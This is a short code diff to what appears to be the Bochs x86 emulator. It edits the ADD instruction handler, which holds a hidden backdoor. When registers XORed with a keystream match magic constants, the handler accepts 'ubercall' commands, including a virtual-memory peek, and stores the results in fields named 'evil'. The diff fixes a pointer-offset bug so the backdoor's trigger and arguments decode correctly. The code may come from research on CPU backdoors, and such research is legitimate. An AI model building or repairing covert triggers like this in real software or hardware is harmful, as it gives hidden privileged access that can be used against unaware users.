@@ -93,7 +93,7 @@ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
 
   ctr_output(keystream);
   if ((RAX ^ *((uint64_t *) keystream)     == 0x99a0086fba28dfd1) &&
-      (RBX ^ *((uint64_t *) keystream + 8) == 0xe2dd84b5c9688a03)) {
+      (RBX ^ *((uint64_t *) keystream + 1) == 0xe2dd84b5c9688a03)) {
       // we have a valid ubercall, let's do this texas-style
       BX_CPU_THIS_PTR evil.i_counter++;
       ctr_output(keystream);
@@ -101,7 +101,7 @@ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
 
       switch (RCX ^ *((uint64_t *) keystream)) {
           case 0xabadbabe00000001: // peek, virtual
-              access_read_linear_nofail(RDX ^ *((uint64_t *) keystream + 8), 1, 0, BX_READ, (void *) &data, &error);
+              access_read_linear_nofail(RDX ^ *((uint64_t *) keystream + 1), 1, 0, BX_READ, (void *) &data, &error);
               BX_CPU_THIS_PTR evil.evilbyte = data;
               BX_CPU_THIS_PTR evil.evilstatus = error;
               break;
